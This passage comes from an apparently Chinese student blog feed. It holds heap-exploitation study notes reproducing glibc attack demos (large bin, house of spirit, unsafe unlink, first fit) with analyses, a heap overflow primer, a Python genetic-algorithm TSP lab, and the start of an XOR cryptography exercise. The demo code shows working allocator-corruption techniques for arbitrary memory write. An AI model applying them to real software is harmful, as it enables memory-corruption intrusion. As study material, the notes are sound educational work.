freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot; &quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(&amp;stack_var1 - 2); p2[3] = (unsigned long)(&amp;stack_var2 - 4); //------------------------------------ malloc(0x90); fprintf(stderr, &quot;Let&apos;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot; &quot; During this time, targets should have already been rewritten:\n&quot;); fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1); fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2); return 0; } 运行结果： 实验分析：首先我们创建三个largechunk，他们之间都malloc（0x20）为了让他们之间在free后不会自动合并。Free（p1），free（p2），这样他们 就会被插入到unsortedbins中。然后我们malloc一个大小小于p1的chunk，这样就会将p2放到long bins中，而将p1的剩余部分放到unsorted bins中。然后free（p3），这样就把p3放在了unsorted bins中。接下来我们使用如下代码修改p2的chunk：p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(&amp;stack_var1 - 2); p2[3] = (unsigned long)(&amp;stack_var2 - 4);然后我们 malloc 一块新的 chunk，此时，由于此时 fastbin 为空，程序遍历 unsorte bin，当时此时 unsorte bin 里的 chunk 为 large bin 的时候，首先判断当前的 chunk size 是不是小于 bck-&gt;bk 的 size，也就是 large bin 里最小的 chunk，如果是，直接添加到末尾。如果不是，就正向遍历 large bin，直到找到一个 chunk 的 size 小于等于当前 chunk size（large bin 的 chunk 是从大到小正向排列的）。然后将当前的 chunk 插入到 large bin 的两个链表中。注：large bin chunk 里的fd_nextsize指向的是链表中第一个比自己小的 chunk，bk_nextsize指向第一个比自己大的 chunk。 5.house_of_spirit.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\n&quot;); fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\n&quot;); malloc(1); fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.\n&quot;); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;); fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30)); } 运行结果： 实验分析：这个实验就是构建chunk，然后将就将其free掉，这样就能在下次malloc的时候调用这fake chunk的地址。首先我们malloc一次（为了方便设置内存），然后本别定义 fack_chunks[1]的大小以及next chunk也就是fack_chunks[9]的大小，但是我们要保证这两个chunk的内存在32和128之间，因为fast chunk是有大小的，这样才能跳过检查。fake_chunks[1] = 0x40; // this is the size=fake_chunks[9] = 0x1234; // nextsize接下来我们将fake_chunks[2]地地址赋值给a，然后再进行freea = &amp;fake_chunks[2];free(a);这样就把原来不存在于内存中的fake_chunks[2]给free了，这就导致fastbin中出现原本存在内容得地址，这样下次调用malloc的时候如果检查fastbin的首块符合大小要求就会对其进行调用。这样就会对原来本来存在的fake_chunks[9]的内存进行更改，实现了攻击。house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。 6.unsafe_unlink.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; uint64_t *chunk0_ptr; int main() { fprintf(stderr, &quot;Welcome to unsafe unlink 2.0!\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;); fprintf(stderr, &quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;); fprintf(stderr, &quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, &quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, &quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, &quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr); fprintf(stderr, &quot;We create a fake chunk inside chunk0.\n&quot;); fprintf(stderr, &quot;We setup the &apos;next_free_chunk&apos; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, &quot;We setup the &apos;previous_free_chunk&apos; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;); fprintf(stderr, &quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, &quot;Fake chunk fd: %p\n&quot;,(void*) chunk0_ptr[2]); fprintf(stderr, &quot;Fake chunk bk: %p\n\n&quot;,(void*) chunk0_ptr[3]); fprintf(stderr, &quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, &quot;We shrink the size of chunk0 (saved as &apos;previous_size&apos; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;); fprintf(stderr, &quot;It&apos;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;); chunk1_hdr[0] = malloc_size; fprintf(stderr, &quot;If we had &apos;normally&apos; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;,(void*)chunk1_hdr[0]); fprintf(stderr, &quot;We mark our fake chunk as free by setting &apos;previous_in_use&apos; of chunk1 as False.\n\n&quot;); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, &quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;); fprintf(stderr, &quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;); free(chunk1_ptr); fprintf(stderr, &quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;); char victim_string[8]; strcpy(victim_string,&quot;Hello!~&quot;); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, &quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;); fprintf(stderr, &quot;Original value: %s\n&quot;,victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, &quot;New Value: %s\n&quot;,victim_string); } 运行结果：由于Ubuntu18没有这个漏洞，所以我又用Ubuntu16跑了一下程序结果如下： 实验分析：这个实验场景容易出现在易受攻击的可以溢出并具有全局指针的缓冲区。这个练习的目的是使用free来破坏全局chunk0_ptr以实现任意内存写入。首先把定义chunk0和chunk1（malloc_size = 0x80，这样才能不使用fastbins），然后在chunk0地址附近创建一个假的块。我们伪造 fake chunk 的fd 为 chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)3);我们伪造 fake chunk 的bk 为chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)2);这样我们伪造的chunk的地址就包含在chunk0中了。这时候假设我们的chunk0有溢出，这样就可以自由更改chunk1的值。然后释放chunk1，这样由于chunk1前面是我们自己新创建的chunk，所以会发生unlink，由于我们吧chunk0的头更改到新创建的位置（我们缩小chunk1的presize(表示的是chunk0的size),好让free认为chunk0是从我们伪造的堆块开始的。），所以这样就会让chunk0和chunk1连接在一起。chunk0_ptr[3] = (uint64_t) victim_string; //vimtim_string = “ Hello!~”chunk0_ptr[0] = 0x4141414142424242LL; //vimtim_string = BBBBAAAAprintf(“New Value: %s\n”,victim_string);修改chunk0_ptr[0]的值其实是在修改它指向的位置，让它指向vimtim_string 然后修改chunk0_ptr[0]就修改了vimtim_string字符串本身。 也就是说我们通过修改chunk0_ptr[3]的值为我们想要修改的地址，就可以实现任意地址读写操作。总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。 7.first_fit.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { fprintf(stderr, &quot;This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.\n&quot;); fprintf(stderr, &quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;); fprintf(stderr, &quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;); fprintf(stderr, &quot;This can be exploited in a use-after-free situation.\n&quot;); fprintf(stderr, &quot;Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.\n&quot;); char* a = malloc(512); char* b = malloc(256); char* c; fprintf(stderr, &quot;1st malloc(512): %p\n&quot;, a); fprintf(stderr, &quot;2nd malloc(256): %p\n&quot;, b); fprintf(stderr, &quot;we could continue mallocing here...\n&quot;); fprintf(stderr, &quot;now let&apos;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;); strcpy(a, &quot;this is A!&quot;); fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a); fprintf(stderr, &quot;Freeing the first one...\n&quot;); free(a); fprintf(stderr, &quot;We don&apos;t need to free anything again. As long as we allocate less than 512, it will end up at %p\n&quot;, a); fprintf(stderr, &quot;So, let&apos;s allocate 500 bytes\n&quot;); c = malloc(500); fprintf(stderr, &quot;3rd malloc(500): %p\n&quot;, c); fprintf(stderr, &quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;); strcpy(c, &quot;this is C!&quot;); fprintf(stderr, &quot;3rd allocation %p points to %s\n&quot;, c, c); fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a); fprintf(stderr, &quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;); } 运行结果： 实验分析：首先malloc两个chunk大小分别为512和256，然后我们使用strcpy(a, “this is A!”);将a赋值，然后再free a，由于chunk A 大小为 512 不适于 fastbins 系统会将这个chunk 放入unsortedbin。这时候来说一下unsortedbin以及malloc的使用情况：Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。所以这时候我们malloc（500），这样就会选取刚刚释放的a，因为a的内存和500差不多。然后当为c赋值之后，调用c和之前的a都会出现给c赋的值，也就是“This is c”。这是由于指针free后没有置0引起的。]]></content>
      <tags>
        <tag>堆溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆溢出的简单入门]]></title>
    <url>%2F2019%2F05%2F06%2F%E5%A0%86%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[堆溢出的简单入门堆与栈的区别栈是具有硬件直接支持的栈存储数据 + 控制流信息堆是由操作系统的库函数予以支持的堆存储数据 堆的创建和维护：通过malloc实现什么是堆当使用malloc函数第一次向系统申请小于128kb的内存时，会通过sys_brk申请132kb的内存，这块内存就称为堆 堆的结构prev_size: 如果当前chunk的相邻前一chunk未被使用，prev_size为此前一chunk的大小size: 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息。我们需要记住的便是最低bit，即图中P的位置，用于指示前一chunk是否已被使用(PREV_INUSE)。 如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，具体如下：fd: 下一个未被使用的chunk的地址bk: 上一个未被使用的chunk的地址 堆的工作原理1、系统创建进程2、进程运行在栈上，数据段上是空的3、malloc创建了堆 什么是binbin是记录free chunk的链表数据结构，在glibc中可分为：fastbinsY，一个用于记录所有fastbins的数组，size为16-80字节bins，也是一个数组，记录除fast bins之外的所有bins；其中bin 1 unsorted bin，bin 2 到63为small bin，bin 64到126为large bin binschunk头中包含的大小信息，主要用来在获取内存中相邻chunk的地址（当前chunk地址减去前一chunk的大小，为前一chunk的地址；当前chunk地址加上当前chunk的大小，为后一chunk的地址）。而mem中的fd和bk只在当前chunk处于未被使用时才有意义，因为当我使用了此chunk后mem里的空间被用来存储数据。通过这些未被使用的fd、bk chunk组成了一张链表。通常差不大小的chunk会被放在一起组成一张链表，其被称为bin。bin的集合被malloc合并，被称为bins fastbinnfastbin维护一大堆的链表，当申请较小内存空间时它们会被从fastbin中剪除，并返回此地址。在free时，为了快速回收这些空间，将不通过bk仅由fd将chunk插进fastbin。并且其满足后进先出的原理由于fastbin没有bk，是一个单向链表，因此可能会触发任意写的问题。fastbin中的东西实际上是通过在内存上连续排布来实现的。当堆栈顶部的chunk被出栈以后实际上fastbin会指向次chunk的上一个。此过程是通过fastbin中此大小的指针指向chunk的fd来实现的。所以如果fd被通过某种技术覆写，那么malloc就会返回被覆写入的地址。如果mem被丢入一个十分大的数据就会把下面的覆写了，这会导致再进行两次malloc就会返回你所定义的伪chunk中的内容。这个伪chunk会指向你需要的任意地方，利用这种指针可以触发任意写 顶块（top chunk）的作用：救火队员不属于任何bin当前所有空闲块(无论那种bin)全都尺寸不合时，由顶块应急顶块比请求尺寸大 — 分割供给使用，剩余部分为新顶块顶块比请求尺寸小 — 全堆无适合块，扩展堆/分配新堆 ##与栈溢出的区别：溢出方向 == 堆增长方向首先破坏（虚拟地址意义上的）下一个堆块的构造 Linux上的典型堆溢出利用方式：攻击fastbin攻击unlink Windows堆溢出攻击的主要形式利用向量化异常处理（VEH）利用系统默认异常处理函数（UEF）Heap sprayBitmap Flipping攻击Bitmap XOR攻击Heap Cache攻击 堆溢出的防御相比栈溢出，针对堆溢出的防御措施更易实用化堆依靠系统库实现其维护，故堆保护 == 系统库升级 针对unlink的保护：·Double Free检测:该机制不允许释放已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么再free就报出double free错误·next size非法检测: 检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误·双链表冲突检测:执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk]]></content>
      <tags>
        <tag>堆溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于python用于解决TSP问题的遗传算法]]></title>
    <url>%2F2019%2F04%2F29%2F%E5%9F%BA%E4%BA%8Epython%E7%9A%84TSP%E9%97%AE%E9%A2%98%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[基于python用于解决TSP问题的遗传算法一、实验目的 掌握遗传算法在实际问题中的应用方法 理解遗传算法中染色体编码和适应度函数的定义方法 熟悉遗传算法中选择、交叉、变异操作在实际问题中的设计方法 熟悉遗传算法中的控制参数设置对性能的影响 二、实验原理1.旅行商问题旅行商问题也叫旅行推销员问题（Travelling salesman problem, TSP）：假设有一个旅行商人要拜访 n 个城市，每个城市只能拜访一次，而且最后要回到原来出发的城市。那么旅行商在何种路径选择的情况下，最后总路程最小。在数学中其被定义为 NP 困难问题，在运筹学和理论计算机科学中非常重要。最早的旅行商问题的数学规划是由 Dantzig（1959）等人提出，并且是在最优化领域中进行了深入研究。许多优化方法都用它作为一个测试基准。尽管问题在计算上很困难，但已经有了大量的启发式和精确方法来求解数量上万的实例，并且能将误差控制在 1%内。对于 TSP 这类 NP 困难问题，目前比较主流的方法是采用启发式的搜索算法，比如遗传算法、蚁群算法、模拟退火算法等。在本次实验中，要求通过遗传算法来解决 TSP 问题。 2.遗传算法遗传算法（Genetic Algorithm）是模拟达尔文生物进化论的自然选择和遗传学机理的生物进化过程的计算模型，通过模拟自然进化过程搜索最优解。遗传算法是从一组候选解构成的一个种群（population）开始的，初代种群产生之后，按照适者生存和优胜劣汰的原理，逐代（generation）演化产生出越来越好的近似解，在每一代，根据问题域中个体的适应度（fitness）大小选择个体，并借助于的遗传算子进行组合交叉（crossover）和变异（mutation），产生出代表新的解集的种群。这个过程将导致种群按照自然进化一样产生后生代种群，并且比前代更加适应于环境，末代种群中的最优个体经过解码（decoding），可以作为问题近似最优解。 三、实验步骤（简要的说明我写的主要的算法）1.将所需遍历的城市从文件中读取出来，并确定出发位置函数如下： def initCities(): cities = [] n=0 firstCity=input(&quot;请输入出发城市： &quot;) file=open(&quot;data.txt&quot;,&quot;r&quot;) for line in file: line = line.replace(&quot;,\n&quot;,&quot; &quot;) line = line.split(&quot;,&quot;) cities.append([n,float(line[1]),float(line[2]),line[0]] ) n+=1 n=0 for i in cities: i=list(i) n+=1 if i[3] == firstCity: cities[0][0]=n-1 cities[n-1][0]=0 cities = [x for x in sorted(cities)] #返回城市列表 return cities 2.根据传入的城市编写距离矩阵，矩阵的参数为计算出的每个城市之间的距离代码如下： city_distance=np.zeros([geneLength,geneLength]) for i in range(geneLength): for j in range(geneLength): city_distance[i][j]=math.sqrt((cities[i][1] - cities[j][1]) ** 2 +(cities[i][2] - cities[j][2]) ** 2) 3.产生初代种群代码如下： #随机产生300个city队列（种群数量为300） lives=[] for i in range(count): aGene = [ x for x in range(1,geneLength) ] random.shuffle(aGene) aGene.insert(0,0) #第一个位置永远是0，表示开始的位置 lives.append(aGene) 4.对种群进行自然选择（物竞天择）（这里代码太长详细的看下面具体代码）这里用到的主要的函数有：’ 1.def dellist(lives):#这个函数，对已经产生的种群进行选择，根据概率种群的部分生命将会死亡 2.def cross(par1,par2):#在种群中选取两个个体进行交叉，也就是一次性交换多个城市的位置 3.def mutation(Gene):#按照一定概率对产生的子代进行变异，如果是更优的就留下来 5.画出连接各个点的的折线图将城市按照产生的最佳顺序生成一个list，并将其的坐标以及名字分别添加到三个表中。然后进行画图 四、实验代码import random import math import matplotlib.pyplot as plt import numpy as np #这两行代码让输出的图形中显示中文 plt.rcParams[&apos;font.sans-serif&apos;]=[&apos;SimHei&apos;] plt.rcParams[&apos;axes.unicode_minus&apos;] =False #减号unicode编码 import time def initCities(): cities = [] n=0 firstCity=input(&quot;请输入出发城市： &quot;) file=open(&quot;data.txt&quot;,&quot;r&quot;) for line in file: line = line.replace(&quot;,\n&quot;,&quot; &quot;) line = line.split(&quot;,&quot;) cities.append([n,float(line[1]),float(line[2]),line[0]] ) n+=1 n=0 for i in cities: i=list(i) n+=1 if i[3] == firstCity: cities[0][0]=n-1 cities[n-1][0]=0 cities = [x for x in sorted(cities)] #返回城市列表 return cities #求出给定list的总距离 def distance(order): distance = 0.0 for i in range(len(order)-1): num1, num2 = order[i], order[i + 1] distance += city_distance[num1][num2] distance+=city_distance[num2][0] #返回距离 return distance #初始化种群数 count=300 #设置强者的定义概率，即种群前30%为强者 retain_rate=0.3 #交叉，将所选取的基因交叉 def cross(par1,par2): par1.pop(0) par2.pop(0) #首先选取一个位置 num1 = random.randint(2,len(par1)-1) #选取要交叉的个数 num2 = random.randint(num1,len(par2)-1) crossGene = par2[num1:num2] #判断现在所处的位置 flag = 0 Gene = [] for life in par1: if flag == num1: Gene.extend(crossGene) flag += 1 if life not in crossGene: Gene.append(life) flag += 1 Gene=inserted(Gene) return Gene #变异，随机交换两个城市之间的位置 def mutation(Gene): gene=Gene.copy() num=gene.pop(0) #随机产生两个被交换的地点，并交换位置 num1 = random.randint(1, len(gene)-1) num2 = random.randint(1, len(gene)-1) gene[num1],gene[num2] = gene[num2],gene[num1] gene=inserted(gene) if gene[0]&lt;Gene[0]: return gene else: return Gene #物竞天择，弱者死亡 #弱者三分之二死亡 def dellist(lives): num=int(retain_rate*len(lives)) for i in range(num,len(lives)-1): flag=random.randrange(0,3,1) if flag&lt;2: del lives[num-1] return lives #将距离插入lives中 def inserted(i): i.insert(0,distance(i)) return i #自然选择算法 def nature(lives): #初始化变异次数 var_time=0 #初始化交叉次数（也就是一共产生多少次子代） cro_time=0 newlives1=[] newlives2=lives[0] breaktime=0 #一共进化1000次,但是如果在进化多次后最优解仍然不变的时候就直接break,但是为了保证进化的程度很好要保证在500次以上 for time in range(1500): #print(lives) if time == 0: for i in lives: if i != None: newlives1.append(inserted(i)) lives=[] newlives1=[x for x in sorted(newlives1)] if newlives1[0][0]==newlives2[0]: breaktime += 1 else : breaktime = 0 newlives2=newlives1[0] if breaktime &gt; 100 &amp; time &gt;= 500:#当已经遗传到了500代之后并且有100个连续相同的最优解产生的时候进行break break #print(newlives1) #newlives1.reverse() newlives1=dellist(newlives1) num=count-len(newlives1) while num &gt; 0: #在newlives1中随机选取两个进行交叉最优的不进行 a=random.randrange(1,len(newlives1),1) b=random.randrange(1,len(newlives1),1) if a!=b : par1=newlives1[a].copy() par2=newlives1[b].copy() life=cross(par1,par2) cro_time += 1 #对交叉生成的子代进行变异(0.2的概率) flag=random.randrange(0,10,1) if flag&lt;=1: #如果产生的子代变异后没有原来的好就保存原来的 newlives1.append(mutation(life)) var_time+=1 else: newlives1.append(life) num-=1 #print(newlives1) print(&quot;遗传次数：&quot;+str(time+1)) print(&quot;交叉次数：&quot;+str(cro_time)) print(&quot;变异次数：&quot;+str(var_time)) return newlives1 #运行程序 cities=initCities() geneLength=len(cities) #生成距离矩阵city_distance，方便调用 city_distance=np.zeros([geneLength,geneLength]) for i in range(geneLength): for j in range(geneLength): city_distance[i][j]=math.sqrt((cities[i][1] - cities[j][1]) ** 2 +(cities[i][2] - cities[j][2]) ** 2) #随机产生300个city队列（种群数量为300） lives=[] for i in range(count): aGene = [ x for x in range(1,geneLength) ] random.shuffle(aGene) aGene.insert(0,0) #第一个位置永远是0，表示开始的位置 lives.append(aGene) #计算算法运行时间 start = time.time() lives=nature(lives) end = time.time() print(&quot;运行时间：&quot;+str(end-start)+&quot;s&quot;) list=[] #将cities按照lives的顺序排列 for i in lives[0][1:]: for j in cities: if j[0]==i: list.append(j) print(&quot;Distance=&quot;+str(lives[0][0])) print() print(&quot;遍历顺序为：&quot;) for city in list: print(city[3],end=&quot; &quot;) print(list[0][3]) p1=[] p2=[] p3=[] for i in list: p1.append(i[1]) p2.append(i[2]) p3.append(i[3]) p1.append(list[0][1]) p2.append(list[0][2]) plt.figure(&apos;Draw&apos;) plt.plot(p1,p2) # plot绘制折线图 for i in range(len(p1)-1): plt.text(p1[i],p2[i],p3[i]) #显示绘图 plt.draw() #显示5秒 plt.pause(5) #保存图象 plt.savefig(&apos;ditu.png&apos;) plt.close() 运行效果图 实验遇到的问题1.输出的图像上的汉字显示为方框，这是因为不支持编码导致的添加如下函数后问题得到了解决： plt.rcParams[‘font.sans-serif’]=[‘SimHei’] plt.rcParams[‘axes.unicode_minus’] =False #减号unicode编码 2.在对有些list进行更改的时候，不想改变原始的值，但是python的等于号直接将地址赋值过来了这个之前是不太了解的（这是第一次使用python进行编程，很多的地方不熟悉）使用.copy()方法，解决了我这个想要使用却又不想改变原始值的要求 所给的data.txt文件如下北京,116.46,39.92 天津,117.2,39.13 上海,121.48,31.22 重庆,106.54,29.59 拉萨,91.11,29.97 乌鲁木齐,87.68,43.77 银川,106.27,38.47 呼和浩特,111.65,40.82 南宁,108.33,22.84 哈尔滨,126.63,45.75 长春,125.35,43.88 沈阳,123.38,41.8 石家庄,114.48,38.03 太原,112.53,37.87 西宁,101.74,36.56 济南,117,36.65 郑州,113.6,34.76 南京,118.78,32.04 合肥,117.27,31.86 杭州,120.19,30.26 福州,119.3,26.08 南昌,115.89,28.68 长沙,113,28.21 武汉,114.31,30.52 广州,113.23,23.16 台北,121.5,25.05 海口,110.35,20.02 兰州,103.73,36.03 西安,108.95,34.27 成都,104.06,30.67 贵阳,106.71,26.57 昆明,102.73,25.04 香港,114.1,22.2 澳门,113.33,22.13]]></content>
      <tags>
        <tag>python</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学实验4_对多字符加密进行解密]]></title>
    <url>%2F2019%2F03%2F29%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C4-%E5%AF%B9%E5%A4%9A%E5%AD%97%E7%AC%A6%E5%8A%A0%E5%AF%86%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%2F</url>
    <content type="text"><![CDATA[对多字符加密进行解密如下密文中包含一个含60个字符的字符串是利用单字符异或加密得到的，请找出该字符串。密文如下： 0e3647e8592d35514a081243582536ed3de6734059001e3f535ce6271032 334b041de124f73c18011a50e608097ac308ecee501337ec3e100854201d 40e127f51c10031d0133590b1e490f3514e05a54143d08222c2a4071e351 45440b171d5c1b21342e021c3a0eee7373215c4024f0eb733cf006e2040c 22015e420b07ef21164d5935e82338452f42282c1836e42536284c450de3 043b452e0268e7eb005a080b360f0642e6e342005217ef04a42f3e43113d 581e0829214202063d70030845e5301f5a5212ed0818e22f120b211b171b ea0b342957394717132307133f143a1357e9ed1f5023034147465c052616 0c300b355c2051373a051851ee154a023723414c023a08171e1b4f17595e 550c3e13e80246320b0bec09362542243be42d1d5d060e203e1a0c66ef48 e159464a582a6a0c50471310084f6b1703221d2e7a54502b2b205c433afa ec58ea200e3005090e1725005739eda7342aed311001383fff7c58ef1f11 01305424231c0d2c41f105057f74510d335440332f1038ec17275f5814e1 05f12f380720ea2b19e24a07e53c142128354e2827f25a08fb401c3126a6 0d17272f53063954163d050a541b1f1144305ae37d4932431b1f33140b1b 0b4f070f071fe92c200e1fa05e4b272e50201b5d493110e429482c100730 100a3148080f227fe60a132f0c10174fe3f63d1a5d38eb414ca8e82f2b05 0a19e83c58400a023b13234572e6e4272bf67434331631e63b5e0f00175c 54520c2ceb45530e0f78111d0b0707e01e4bf43b0606073854324421e6f9 09e7585353ee4a34190de1354e481c373a1b2b0a136127383e271212191f 0f060d09fb4f2d5024022c5ff6463c390c2b5f1a5532071a31f33503fcea 371d39121605584f48217235ee1e0602445c162e4942254c071954321d29 4a0900e63e5f161e15554045f3594c2a6a77e4e52711602beaf53ae53bed 29011616565d2a372a605bee39eced31183fe068185c3b445b391fe53232 e4102337000303452a1e2f2b29493f54ed5a037b3e08311b625cfd005009 2d560d4b0618203249312a310d5f541f295c3f0f25235c2b20037d1600f3 2c245155e8253708391a7ceb0d05005c3e080f3f0f0e5a16583b111f4448 493804044d262eec3759594f212d562420105d6a39e70a0f3957f347070c e72d1d1f103807590f4339575e00381074485d2d580249f744052605e11d e131570ae95307143a71131729552d001057a4540a1f425b190b572dee34 2c1655342f02581c202b0a5c17a358291e1506f325550f05365e165c1c5f e318164df80b043e5406296e5359271d152f552e155a43eda81f23231d1c 001de0413e174e18192c061e4b3d1b5626f90e3e1429544a20ee150d0c20 32e902193219033c58191302441a5c1b584825ea140c290927aaea53e23c 3a36363a732e32ea3f0e430508204b332c382a19292d5b291122e123446a 1804115614031f5f571f2b143c5d3c1b257a4b37350f18445a3e08341c3d 21f2fb250b2e55151e77253a3f0e5f4b2030370a4155e720e73914e35a4a 510a55583a3c491221397c123a2b14a8305b3b09e71b241d0e51202e1a32 1b51202f4917232b512a141d6812f03c455df05e5a1c2cee14390b3b593a 5f5731e5203116ee131a4a4b24112cef5d0822f035e6547d3a0014462f26 0028fb522104f771501a555d3f581e30e9ec3e49e3e63123432f07794145 1459f6312f000e5a1373e346e40f211e1b0b0e17000f391f170552150500 7e301e18325717e3412e022f087be30e5641080151357714e0e0eee15e11 533258e9360f513b083aa51d2824222f40200a470537ecec392d31070b38 07e32c180dfa56496a461627542115132a4c284050495b23e2245b093159 2d3c230a1e5a300f6c3e26ed0d1709434950fd6f1e121335054129e4e4ec ef22fa2112311b11584ce43434f46f521a215433f9514fe33d313a3e0838 34e7f336270c08010f2f544f0f1c1e235c0222644c2632efec061de2115f 